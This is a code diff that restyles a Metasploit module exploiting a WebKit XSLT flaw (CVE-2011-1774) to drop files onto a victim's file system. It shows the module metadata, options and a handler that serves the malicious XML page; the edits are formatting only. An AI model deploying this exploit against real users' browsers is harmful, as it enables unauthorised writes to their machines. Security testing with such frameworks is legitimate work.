@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,40 +7,40 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Cross Platform Webkit File Dropper',
-      'Description' => %q{
-          This module exploits a XSLT vulnerability in Webkit to drop ASCII or UTF-8
-        files to the target file-system.  By default, the file will be dropped in
-        C:\Program Files\
-      },
-      'Author'      => [ 'Nicolas Gregoire' ],
-      'License'     => MSF_LICENSE,
-      'Actions'     =>
-        [
-          [ 'WebServer' ]
-        ],
-      'PassiveActions' =>
-        [
-          'WebServer'
-        ],
-      'DefaultAction'  => 'WebServer'))
+                      'Name'        => 'Cross Platform Webkit File Dropper',
+                      'Description' => %q(
+                          This module exploits a XSLT vulnerability in Webkit to drop ASCII or UTF-8
+                        files to the target file-system.  By default, the file will be dropped in
+                        C:\Program Files\
+                      ),
+                      'Author'      => [ 'Nicolas Gregoire' ],
+                      'License'     => MSF_LICENSE,
+                      'Actions'     =>
+                        [
+                          [ 'WebServer' ]
+                        ],
+                      'PassiveActions' =>
+                        [
+                          'WebServer'
+                        ],
+                      'DefaultAction'  => 'WebServer'))
 
     register_options(
       [
         OptString.new('REMOTE_PATH', [ true, "Location of the remote file", 'flag.txt' ]),
         OptString.new('REMOTE_CONTENT', [ true, "Content of the remote file", 'Hello from CVE-2011-1774' ])
-      ], self.class)
+      ], self.class
+    )
   end
 
-  def on_request_uri(cli, request)
-    path  = datastore['REMOTE_PATH']
-    content  = datastore['REMOTE_CONTENT']
+  def on_request_uri(cli, _request)
+    path = datastore['REMOTE_PATH']
+    content = datastore['REMOTE_CONTENT']
     html = <<-EOS
 <?xml-stylesheet type="text/xml" href="#fragment"?>
 <!-- Define the DTD of the document
@@ -80,11 +81,10 @@ EOS
 
     print_status("Sending XSLT payload ...")
     print_status("Destination file : #{path}")
-    send_response_html(cli, html, { 'Content-Type' => 'application/xml' })
+    send_response_html(cli, html, 'Content-Type' => 'application/xml')
   end
 
   def run
-    exploit()
+    exploit
   end
-
 end
